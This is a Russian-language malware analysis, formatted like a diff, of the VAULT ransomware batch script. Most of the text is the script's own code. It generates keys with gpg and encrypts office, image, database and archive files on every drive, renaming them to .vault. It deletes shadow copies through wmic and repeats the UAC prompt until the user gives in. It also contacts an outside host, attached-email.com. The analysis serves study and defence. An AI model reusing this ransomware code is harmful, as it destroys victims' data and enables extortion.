+За этим следует инициализация некоторых переменных случайными числами. Впоследствии сгенерированные значения будут записаны в файл VAULT.KEY, однако с какой целью — для меня осталось неясным. Единственное, что приходит в голову, — это просто уникальный маркер зараженного ПК. Но зачем он нужен? Было бы здорово услышать от кого-нибудь пару версий.set 715c7be3=!RANDOM!
+set b67b5d00=!RANDOM!
+set dc841a88=!RANDOM!
+set db5a2d8a=!RANDOM!
+set ee1f189d=!RANDOM!
+set 2162ea2b=!RANDOM!
+set 58d179b8=!RANDOM!
+set 3d645b52=RU
+
+Идущий далее блок кода подготавливает почву для запуска исполняемого файла gpg.exe. Вначале троянец перемещает в другой каталог старую базу данных утилиты GPG (если она присутствует на ПК), а затем создает файл со списком команд, которые должна выполнить GPG на данном этапе.Key-Type: RSA — тип ключа;
+Key-Length: 1024 — длина ключа в битах;
+Name-Real: Cellar — имя пользователя-владельца ключа.
+if exist "%APPDATA%\gnupg" RENAME "%APPDATA%\gnupg" gnupg_%random%
+echo Key-Type: RSA&gt; "%temp%\9c668934.2ca1046c"
+echo Key-Length: 1024&gt;&gt; "%temp%\9c668934.2ca1046c"
+echo Name-Real: Cellar&gt;&gt; "%temp%\9c668934.2ca1046c"
+
+Наконец, после этого запускается сам файл gpg.exe с заданным набором параметров:--batch: пакетный режим (без пользовательского ввода);
+--homedir "%temp%": установить каталог %temp% в качестве домашнего;
+--gen-key "%temp%\9c668934.2ca1046c": сгенерировать ключ согласно параметрам, указанным в файле 9c668934.2ca1046c.
+"%temp%\gpg.exe" --batch --homedir "%temp%" --gen-key "%temp%\9c668934.2ca1046c"
+
+После этого gpg создаст в своем рабочем каталоге (%temp%) набор файлов с ключевой информацией.
+Далее осуществляется запись открытого ключа в файл %temp%\03dfb98e.7087b06e. Это — открытый ключ злоумышленников; с его помощью будет потом зашифрован закрытый ключ шифрования пользовательских файлов.echo -----BEGIN PGP PUBLIC KEY BLOCK-----&gt; "%temp%\03dfb98e.7087b06e"
+echo Version: GnuPG v1&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo.&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo mI0EVbFePwEEAMM+eRmPkcVTTwqLOyCkSlOTDjfnJpU2vTt94yMq1c1Ix1RF2fxp&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo S9ZDuQ9qfhqUxXiUtsEY7kB1pHtcyCeqtdrYST4YzJTeNCZNTiq2mVkQlPXqcvO/&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo hXpyYH/DNB6XmdQP9rmb/gIb5qHpRNoWlb1MBDZAJnHU3PEA2LcXbBX/ABEBAAG0&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo ClZhdWx0Q3J5cHSIuAQTAQIAIgUCVbFePwIbLwYLCQgHAwIGFQgCCQoLBBYCAwEC&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo HgECF4AACgkQ+Zg2Eii5y+eiQQQAm9r0sfXO5pp4/yy6lJG+zZAiijgzECVAQvw9&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo j+JE6n7mZnZDm632PrLumTHE9PauifXmyTFf0RPUI/D5B8QFPQn9hoNf041aaEgq&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo bTQSy7TIwZJfTyZyq/yhJiH0RLI7yhj/88sjX+uu7miGHO9jb1ygTo/qe5n3Q/Vp&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo xpSJJFU=&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo =CuiR&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo -----END PGP PUBLIC KEY BLOCK-----&gt;&gt; "%temp%\03dfb98e.7087b06e"
+
+За этим следует минутка интересного: в файл %temp%\3637bf69.36ddf8fe экспортируется закрытый ключ, который будет использоваться для шифрования. Используются следующие параметры:-r Cellar: имя пользователя-владельца ключа;
+--export-secret-keys: экспорт (в stdout) информации о закрытом ключе;
+--yes: на большинство вопросов утилиты отвечать «да»;
+--homedir "%temp%": установить каталог %temp% в качестве домашнего;
+-a: сделать вывод ASCII armored (все выходные символы будут взяты из таблицы ASCII).
+"%temp%\gpg.exe" -r Cellar --export-secret-keys --yes --homedir "%temp%" -a&gt; "%temp%\3637bf69.36ddf8fe"
+Пример сгенерированного ключа (при каждом запуске, разумеется, генерируется новый, уникальный, ключ):-----BEGIN PGP PRIVATE KEY BLOCK-----
+Version: GnuPG v1
+lQHYBFXmA8ABBADExeQcls8GeiNhzNMP29XfBG6xI3No4n6/Hc30FopRPZrsHxQW
+thj54lhhHcNwSIWdXfoR/5p1zYEOW5C+fFd5M2apGifrYorzNtNfgV4GtcheRnhg
+xipyDFzdhG+mbpnA4SnZ9VJPdRbaufLkWDO2ZHZNYp3A3VBx6dDB2zW8+wARAQAB
+AAP9G7r3Azpo5t+b5eKmKe7QAfO6H8JAYkXCbpo7gIxpULqkVGYAKuqIXuAm7ATJ
+mqTLGQV57O2/GElDneuJ3KEMTdvZu39z7NCnsEkws3AwkwU5uoaTFDxd+CIVHE6g
+Ln29eoT5NdBJYw2hRiZgnCX5GKVc849IE9ELtmvQkw2RaSkCANjn2jcSbLPwBdz9
+fySdoUGu02AEenWz3c6hCuUSGzX/2/tXm/xWgaxlQCsfF6TEOUgcbnmzHINY8VjF
+769958kCAOg9G0Xn5U5i352GAybOnn5lEBm6dh8/pEis804MywaZNmPur9DOJIXS
+7oCwQnfj4z+hAJEpa7vWtT1PgDyV6KMB/jxJ6deTkpBqkMdY6a+BFEPUUzzOm5js
+2qhsl2TRTnOwIe1N4TEiCSAwS515jUDtU+xz4dsxwyhrUUDznaUEfrijdrQGQ2Vs
+bGFyiLgEEwECACIFAlXmA8ACGy8GCwkIBwMCBhUIAgkKCwQWAgMBAh4BAheAAAoJ
+EOiU7FYrzN14/cYEAJrXHg0aRasSUs6pnIOf+N8vwznPEzPGCCfEAI56WVxSZwxP
+D5Rp/QIF51hJQQgOUv2AzC9INzCkT0AJn8Tejd1SQWF9y53nk8R4HK0BGftBlUNS
+wBk2+dwH/VEhvGWa+Mlj9t2kHgim9wQowRa47QWrEUfWdOlj3Fgxc4kKD6zU
+=O4tL
+-----END PGP PRIVATE KEY BLOCK-----
+Посмотрим на этот файл и хорошенько его запомним. Пока это только зародыш, но всего через несколько минут он превратится в печально известный VAULT.KEY.
+Следующая строка удаляет созданный ранее файл %temp%\9c668934.2ca1046c с параметрами ключа.del /f /q "%temp%\9c668934.2ca1046c"
+
+После этого в файл %temp%\3637bf69.36ddf8fe дописываются дата, имя пользователя и имя ПК, а также некоторая служебная информация и несколько случайных чисел, сгенерированных в начале работы скрипта.echo.&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo BDATE: !DATE!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo UNAME: !USERNAME!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo CNAME: !COMPUTERNAME!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo PQQID: AKG-4813&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo ULANG: !3d645b52!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 01HSH: !715c7be3!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 02HSH: !b67b5d00!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 03HSH: !db5a2d8a!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 04HSH: !dc841a88!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 05HSH: !ee1f189d!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo FHASH: !2162ea2b!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+4.2 Подготовка к шифрованию файловВажное замечание:Сам главный скрипт (install.bat) выполняет не так уж и много операций. Основную работу выполняют его дочерние процессы-скрипты, которые запускаются с помощью «пусковых установок» — крохотных JS- и VB-файлов.
+Например, шифрование происходит в три этапа. Вначале создается файл %temp%\61231f25.9db8b89a с кодом скрипта, который будет зашифровывать все файлы с определенными расширениями. Затем из этого файла удаляются все строки, относящиеся к шифрованию «системных» файлов (тех, которые находятся в системных каталогах или имеют некоторые ключевые слова в именах), и результат сохраняется под другим именем (%temp%\4c2e533d.cmd). После этого файл %temp%\4c2e533d.cmd запускается на выполнение с помощью JS-стартера.
+Следующая часть кода ищет на ПК все файлы с расширениями «xls» и «doc» и подготавливает информацию для их шифрования.echo chcp 866 &gt; "%temp%\61231f25.9db8b89a"
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :1010f32d %%f
+
+:1010f32d
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.xls *.doc) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+
+Вроде бы всего несколько строк кода, но какие-то они запутанные. Давайте разберемся.Подготовка к шифрованию:Первая часть:dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.xls *.doc) do (
+
+Команда dir /B выведет имена всех файлов, которые находятся в "%1:\". Фактически так скрипт пробежит по всем томам (логическим дискам), имеющимся на ПК: «A:\», «B:\», «C:\» — и так далее, до «Z:/».
+Для каждого тома вызывается цикл for с ключом /r, который обеспечивает рекурсивный обход всех подкаталогов и выполнение тела цикла для всех вложенных файлов.
+Из всех найденных файлов отбираются файлы с расширением «xls» и «doc», и в файл %temp%\61231f25.9db8b89a записывается последовательность из трех команд, которая будет вызвана для каждого файла.Вторая часть:echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"
+move /y "%%i.gpg" "%%i"
+RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+
+Первая команда из приведенной выше последовательности шифрует файлы. Давайте разберем указанные параметры GPG:-r Cellar: имя пользователя;
+--yes: на большинство вопросов утилиты отвечать «да»;
+-q: стараться сделать процесс как можно более «тихим» (без взаимодействия с пользователем);
+--no-verbose: убрать информационные сообщения;
+--trust-model always: заставляем GPG доверять секретному ключу, который мы укажем (без этой опции GPG может выдать предупреждение о том, что ключ шифрования не подписан доверенной цифровой подписью);
+--encrypt-files: позволяет шифровать сразу несколько файлов (имя каждого файла должно быть записано с новой строки).
+
+После выполнения первой команды утилита gpg создает рядом с исходным файлом его зашифрованную версию. Например, если имя исходного файла — test.doc, то зашифрованный файл будет иметь имя test.doc.gpg.
+Вторая команда замещает исходные файлы зашифрованными.
+Третья команда меняет расширение зашифрованных файлов на «vault». Таким образом, вместо файла test.doc появится файл test.doc.vault.
+Таким образом, в файле %temp%\61231f25.9db8b89a будет содержаться подпрограмма шифрования всех файлов с расширением «xls» и «doc», обнаруженных на томах ПК (в том числе и на подключенных сетевых дисках).Третья часть:echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+
+Скрипт дописывает в конец файла %temp%\21b0fb7b.7ca0ec0c исходные имена файлов, подлежащих зашифрованию.
+Далее скрипт дописывает в файл %temp%\61231f25.9db8b89a еще несколько команд. Они ищут файл VAULT.KEY в одном из следующих каталогов:%TeMp%;
+%AppDATA%;
+%USERPROFILE%\Desktop.
+
+Если такой файл находится, то в его конец дописывается строка 01FNSH-OK — по всей видимости, маркер успешного окончания первого этапа шифрования файлов.echo if exist "%%TeMp%%\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto 441f5342
+
+Затем начинается следующий функциональный блок кода — удаление теневых копий.
+В папке %Temp% создается три файла:59665d79.vbs — файл VBScript, который удаляет теневые копии тома командойwmic.exe shadowcopy delete /nointeractive(подробнее про команду можно почитать, например, здесь (англ.));
+acda3f33.js — файл WScript, единственное предназначение которого — запуск файла 69aca909.cmd;
+69aca909.cmd — проверяет, какая версия ОС установлена на ПК; если значение параметра реестра «CurrentVersion» в ветке HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion равно 6 (как в Windows 7), то запускаются 16 экземпляров скрипта 59665d79.vbs, который удаляет теневые копии. После этого файлы 59665d79.vbs и acda3f33.js удаляются, а в файл 69aca909.cmd вместо программного кода записывается число 1107cc4c.
+
+Далее с помощью wscript.exe запускается файл acda3f33.js, который, в свою очередь, запускает файл 69aca909.cmd.Код (чуть отформатирован, чтобы было проще читать):echo Set objShell = CreateObject^("Shell.Application"^) &gt; "%temp%\59665d79.vbs"
+echo Set objWshShell = WScript.CreateObject^("WScript.Shell"^) &gt;&gt; "%temp%\59665d79.vbs"
+echo Set objWshProcessEnv = objWshShell.Environment^("PROCESS"^) &gt;&gt; "%temp%\59665d79.vbs"
+echo objShell.ShellExecute "wmic.exe", "shadowcopy delete /nointeractive", "", "runas", 0 &gt;&gt; "%temp%\59665d79.vbs"
+
+echo 
+var cdp="%%TEMP%%\\69aca909.cmd";
+var WshShell=CreateObject("WScript.Shell");
+cdp=WshShell.ExpandEnvironmentStrings(cdp);
+function CreateObject(fq){
+  return new ActiveXObject(fq)
+}
+function xx(cdp){
+  WshShell.Run(cdp,0,0);
+}
+xx(''+cdp+'');
+&gt; "%temp%\acda3f33.js"
+
+echo.&gt; "%temp%\69aca909.cmd"
+echo SetLocal EnableDelayedExpansion&gt;&gt; "%temp%\69aca909.cmd"
+echo for /f "tokens=2*" %%%%i in ^('reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentVersion"'^) do set fnd7=%%%%j&gt;&gt; "%temp%\69aca909.cmd"
+echo if not %%fnd7:~0,1%% GEQ 6 goto a3811a18&gt;&gt; "%temp%\69aca909.cmd"
+echo set ntries=^0&gt;&gt; "%temp%\69aca909.cmd"
+echo :3c843d11&gt;&gt; "%temp%\69aca909.cmd"
+echo wscript.exe //B //Nologo "%%temp%%\59665d79.vbs"^&amp; tasklist^|findstr /i wmic.exe&gt;&gt; "%temp%\69aca909.cmd"
+echo if not ^^!errorlevel^^!==0 ^(&gt;&gt; "%temp%\69aca909.cmd"
+echo set /a ntries+=^1&gt;&gt; "%temp%\69aca909.cmd"
+echo if not ^^!ntries^^! GEQ 16 goto 3c843d11&gt;&gt; "%temp%\69aca909.cmd"
+echo ^)&gt;&gt; "%temp%\69aca909.cmd"
+echo :a3811a18&gt;&gt; "%temp%\69aca909.cmd"
+echo del /f /q "%temp%\acda3f33.js"&gt;&gt; "%temp%\69aca909.cmd"
+echo del /f /q "%temp%\59665d79.vbs"&gt;&gt; "%temp%\69aca909.cmd"
+echo echo del /f /q "%temp%\59665d79.vbs"&gt;&gt; "%temp%\69aca909.cmd"
+echo echo 1107cc4c ^&gt; "%%temp%%\69aca909.cmd"&gt;&gt; "%temp%\69aca909.cmd"
+
+start wscript.exe //B //Nologo "%temp%\acda3f33.js"
+NB:Если включен UAC, то при попытке удалить теневые копии он выдаст предупреждающее сообщение:
+Однако команда удаления теневых копий вызывается 16 раз — видимо, с тем расчетом, что на тринадцатый или четырнадцатый раз пользователь сдастся и нажмет «Да».
+Что ж — справедливо. Я бы, пожалуй, нажал.
+Если упорно нажимать «Нет» до победного — теневые копии не удалятся.
+Ну а если все-таки нажать «Да»…
+Затем для файлов различных типов последовательно вызываются нескольких процедур подготовки к шифрованию. Алгоритм абсолютно тот же, что и для файлов с расширениями «xls» и «doc», который выполнялся ранее:вначале для каждого файла заданного типа в файл %temp%\61231f25.9db8b89a записывается набор команд для шифрования, а в файл %temp%\21b0fb7b.7ca0ec0c дописывается имя исходного файла;
+Затем в файл %temp%\61231f25.9db8b89a дописывается проверка, нет ли в каталогах %TeMp%, %AppDATA% и %USERPROFILE% файла VAULT.KEY. Если такие файлы находятся, то в них дописывается сообщение об успешном завершении очередной стадии шифрования файлов.
+Довольно много одинаковых строчек:FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :c68cd952 %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto 9b100e11
+
+:c68cd952
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.pdf *.rtf) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+
+:9b100e11
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :a556dfcb %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto cd9f3e2a
+
+:a556dfcb
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.psd *.dwg *.cdr) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+
+:cd9f3e2a
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :071faa5e %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto e0aede1c
+
+:071faa5e
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.cd *.mdb *.1cd *.dbf *.sqlite) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+
+:e0aede1c
+FOR %%s IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :f941ecc1 %%s
+echo if exist "%%TeMp%%\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto ca70214e
+
+:f941ecc1
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.jpg *.zip) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+
+:ca70214e
+4.3 Создание VAULT.KEY
+Вначале в папке "%Temp%" создается JS-файл со случайным именем, который при запуске обращается к веб-ресурсу http://attached-email.com/c1.php (на данный момент не функционирует).Код:set loco=!random!!random!
+echo function CreateObject^(b^){return new ActiveXObject^(b^)} &gt;&gt; !loco!.js
+echo function ok^(b^){var c=new ActiveXObject^("MSXML2.XMLHTTP"^);c.open^("GET",b,0^);c.send^(^)} &gt;&gt; !loco!.js
+echo ok^("http://attached-email.com/c1.php"^); &gt;&gt; !loco!.js
+wscript.exe //B //nologo //T:40 "!loco!.js"
+
+Зачем нужно это обращение — тоже загадка. Скорее всего, просто для статистики, которую собирают производители ПО.
+Аналитика, конверсия, рентабельность… Ах.
+Далее в файл 61231f25.9db8b89a, где хранится подпрограмма шифрования, добавляется команда записи маркеров успешного окончания очередного этапа работы скрипта в файлы VAULT.KEY, расположенные в папках %TeMp%, %AppDATA% и %USERPROFILE%\Desktop. После этого в файл 61231f25.9db8b89a добавляется команда записи в файл %TeMp%\4c2e533d.cmd числа 1e759748 и последующее удаление самого файла %TeMp%\4c2e533d.cmd.Код:echo echo FHASH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo echo FHASH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo echo FHASH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo echo 1e759748 ^&gt; "%%TeMp%%\4c2e533d.cmd"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo del /f /q "%%TeMp%%\4c2e533d.cmd"&gt;&gt; "%temp%\61231f25.9db8b89a"
+
+Затем из файла %temp%\21b0fb7b.7ca0ec0c, где хранятся исходные имена пользовательских файлов, которые будут зашифрованы, исключаются системные файлы. Это делается в два этапа: вначале из списка удаляются строки, в которых присутствуют «системные» слова (например, windows или msoffice), а затем — строки, в которых присутствуют названия служебных и временных каталогов системы.
+Аналогичная операция производится с файлом, где хранится код скрипта шифрования (%temp%\61231f25.9db8b89a).
+Результаты сохраняются в файлы %temp%\8f9c3dbb.9767d548 и %temp%\4c2e533d.cmd соответственно. После этого файлы с исходными и промежуточными списками удаляются.Код:findstr /i /v "windows recycle program avatar roaming msoffice temporary sample themes uploads csize resource internet com_ intel common resources texture profiles library clipart manual games framework64 setupcache autograph maps amd64 cache support guide abbyy application thumbnails avatars template adobe" "%temp%\21b0fb7b.7ca0ec0c"&gt; "%temp%\97cf86b0.e479bce7"
+findstr /i /v "windows recycle program avatar roaming msoffice temporary sample themes uploads csize resource internet com_ intel common resources texture profiles library clipart manual games framework64 setupcache autograph maps amd64 cache support guide abbyy application thumbnails avatars template adobe" "%temp%\61231f25.9db8b89a"&gt; "%temp%\f2a431bc.6ccc04ec"
+findstr /v "AppData APPDATA appdata temp TEMP Temp" "%temp%\97cf86b0.e479bce7"&gt; "%temp%\8f9c3dbb.9767d548"
+findstr /v "AppData APPDATA appdata temp TEMP Temp" "%temp%\f2a431bc.6ccc04ec"&gt; "%temp%\4c2e533d.cmd"
+del /f /q "%temp%\97cf86b0.e479bce7"
+del /f /q "%temp%\f2a431bc.6ccc04ec"
+del /f /q "%temp%\21b0fb7b.7ca0ec0c"
+del /f /q "%temp%\61231f25.9db8b89a"
+NB:Интересно, чем обусловлен такой выбор ключевых слов… Скажем, windows и program мне еще понятны. Но avatars? abbyy?!
+Далее в файл %temp%\3637bf69.36ddf8fe, где хранится техническая информация о работе скрипта, дописывается очередная порция данных:одно из случайных чисел, сгенерированных в начале работы скрипта;
+общее количество зашифрованных файлов;
+количество зашифрованных файлов по конкретным расширениям (xls, doc и т. д.).
+
+Затем в файл 8f9c3dbb.9767d548, где содержится список зашифрованных файлов, дописывается пустая строка и то же случайное число, сгенерированное в начале работы скрипта. После этого удаляется JS-файл, созданный ранее со случайным именем в папке %Temp% и обращавшийся к адресу http://attached-email.com/c1.php.Код:echo XCONF: !58d179b8!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+set 3a3b7af1=66668
+for /f %%f in ('find /c /v ""^&lt; "%temp%\8f9c3dbb.9767d548"') do (
+set 3a3b7af1=%%f
+)
+echo QNTTY: !3a3b7af1!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+for %%c IN (01:xls 04:doc 05:rtf 10:pdf 11:psd 12:dwg 13:cdr 19:cd 20:mdb 21:1cd 23:dbf 24:sqlite 26:jpg 27:zip) do (
+for /f "tokens=1,2 delims=:" %%i in ("%%c") do (
+for /f %%b in ('find /c /i ".%%j"^&lt; "%temp%\8f9c3dbb.9767d548"') do (
+echo %%iEXT: %%b&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+)))
+echo 02EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 03EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 06EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 07EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 08EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 09EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 14EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 15EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 16EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 17EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 18EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 22EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 25EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 28EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 29EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo.&gt;&gt; "%temp%\8f9c3dbb.9767d548"
+echo XCONF: !58d179b8!&gt;&gt; "%temp%\8f9c3dbb.9767d548"
+del /f /q "!loco!.js"
+
+Далее создаются печально известный VAULT.KEY (это зашифрованный файл %temp%\3637bf69.36ddf8fe, в котором хранится ключевая информация и данные о работе скрипта) и CONFIRMATION.KEY (это зашифрованный файл %temp%\8f9c3dbb.9767d548, в котором хранится список имен зашифрованных файлов и немного служебной информации). Шифрование происходит двумя различными командами GPG (видимо, на случай, если с первого раза команда не отработает).
+Если после двух попыток VAULT.KEY так и не получилось создать, управление переходит к метке 6d0f24b8, где располагается код процедуры на VB (будет рассмотрен далее).
+В конец файла VAULT.KEY дописываются сгенерированные в начале работы скрипта случайные числа.Код:"%temp%\gpg.exe" --import "%temp%\03dfb98e.7087b06e"
+del /f /q "%temp%\03dfb98e.7087b06e"
+"%temp%\gpg.exe" -r recipient  --yes -q --no-verbose --trust-model always -o "%temp%\VAULT.KEY" -e "%temp%\3637bf69.36ddf8fe"
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always -o "%temp%\CONFIRMATION.KEY" -e "%temp%\8f9c3dbb.9767d548"
+if not exist "%temp%\VAULT.KEY" (
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always --encrypt-files "%temp%\3637bf69.36ddf8fe"
+RENAME "%temp%\3637bf69.36ddf8fe.gpg" VAULT.KEY
+)
+if not exist "%temp%\CONFIRMATION.KEY" (
+"%temp%\gpg.exe" -r VaultCrypt --yes -q --no-verbose --trust-model always --encrypt-files "%temp%\8f9c3dbb.9767d548"
+RENAME "%temp%\8f9c3dbb.9767d548.gpg" CONFIRMATION.KEY
+)
+if not exist "%temp%\VAULT.KEY" (
+del /f /q "%temp%\*.vlt"
+del /f /q "%temp%\*.gpg"
+del /f /q "%temp%\random_seed"
+del /f /q "%temp%\*.lock"
+del /f /q "%temp%\*.bak"
+del /f /q "%temp%\*.list"
+goto 6d0f24b8
+)
+echo.&gt;&gt; "%temp%\VAULT.KEY"
+echo 01FNSH-!715c7be3!&gt;&gt; "%temp%\VAULT.KEY"
+echo 02FNSH-!b67b5d00!&gt;&gt; "%temp%\VAULT.KEY"
+echo 03FNSH-!db5a2d8a!&gt;&gt; "%temp%\VAULT.KEY"
+echo 04FNSH-!dc841a88!&gt;&gt; "%temp%\VAULT.KEY"
+echo 05FNSH-!ee1f189d!&gt;&gt; "%temp%\VAULT.KEY"
